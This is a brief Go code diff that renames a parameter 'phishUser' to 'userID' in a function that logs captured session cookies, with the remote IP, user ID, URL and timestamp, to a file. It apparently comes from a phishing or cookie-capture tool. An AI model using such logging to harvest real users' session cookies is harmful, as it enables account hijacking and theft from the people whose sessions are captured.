@@ -49,14 +49,14 @@ func toFile(data string) {
 
 }
 
-func Cookies(phishUser string, URL string, cookies []string, IP string) {
+func Cookies(userID string, URL string, cookies []string, IP string) {
 
 	cookieString := strings.Join(cookies, "####")
 
 	toFile("\nCOOKIES" +
 		"\n======\nTimestamp: " + time.Now().Format(time.RFC850) +
 		"\n======\nRemoteIP: " + IP +
-		"\n======\nUUID: " + phishUser +
+		"\n======\nUUID: " + userID +
 		"\n======\nURL: " + URL +
 		"\n======\n" + string(cookieString) +
 		"\n======\n")
